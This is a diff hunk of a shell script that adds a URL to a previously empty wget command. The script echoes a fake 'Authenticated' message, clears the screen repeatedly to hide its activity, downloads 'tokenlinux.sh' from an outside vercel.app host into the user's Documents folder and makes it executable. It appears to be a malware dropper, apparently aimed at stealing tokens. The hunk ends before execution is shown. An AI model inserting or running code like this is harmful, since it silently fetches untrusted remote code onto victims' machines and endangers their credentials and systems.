@@ -3,7 +3,7 @@ set -e
 echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.sh" ""
+wget -q -O "$TARGET_DIR/tokenlinux.sh" "https://vercel-rho-amber-58.vercel.app/kmHgMq7/tokenlinux.sh"
 clear
 chmod +x "$TARGET_DIR/tokenlinux.sh"
 clear
